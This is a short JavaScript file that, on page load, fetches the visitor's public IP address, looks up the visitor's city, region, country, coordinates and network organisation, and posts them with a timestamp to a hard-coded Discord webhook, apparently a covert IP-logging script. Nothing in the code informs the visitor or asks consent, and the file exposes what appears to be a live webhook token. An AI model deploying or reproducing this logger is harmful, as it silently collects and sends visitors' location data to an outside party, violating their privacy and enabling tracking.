// Discord webhook URL - Replace with your actual webhook URL
const discordWebhookUrl = 'https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC'; // Replace with your Discord webhook URL

// Fetch the client's public IP address using the ipify API
async function fetchIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }

        const data = await response.json();
        const userIp = data.ip;
        console.log('IP address:', userIp);

        // Now get detailed information about the IP address from ipinfo.io
        await fetchIPInfo(userIp);
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

// Get detailed information about the IP address from ipinfo.io
async function fetchIPInfo(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        if (!response.ok) {
            throw new Error('Failed to fetch IP information');
        }

        const data = await response.json();
        console.log('IP information:', data);

        // Create a custom message to send to Discord
        const ipDetails = `
            IP: ${data.ip}
            City: ${data.city || 'N/A'}
            Region: ${data.region || 'N/A'}
            Country: ${data.country || 'N/A'}
            Location: ${data.loc || 'N/A'}
            Org: ${data.org || 'N/A'}
        `;
        
        // Send the IP information to Discord
        await sendToDiscord(ipDetails);
    } catch (error) {
        console.error('Error fetching IP information:', error);
    }
}

// Send the IP address and information to Discord using the webhook
async function sendToDiscord(ipDetails) {
    try {
        // Get the current timestamp in Central Time (Oklahoma timezone)
        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'America/Chicago', // Central Time Zone
            hour12: true,               // 12-hour clock (AM/PM)
            year: 'numeric',            // Full year
            month: 'long',              // Full month name
            day: 'numeric',             // Day of the month
            hour: 'numeric',            // Hour (1-12)
            minute: 'numeric',          // Minutes (00-59)
            second: 'numeric',          // Seconds (00-59)
        });

        // Create the payload with the timestamp and IP details
        const payload = {
            content: `IP Information at ${timestamp}:\n${ipDetails}`, // The message sent to the Discord channel
        };

        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }

        console.log('Successfully sent to Discord:', ipDetails);
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// Call the fetchIP function when the page loads
fetchIP();
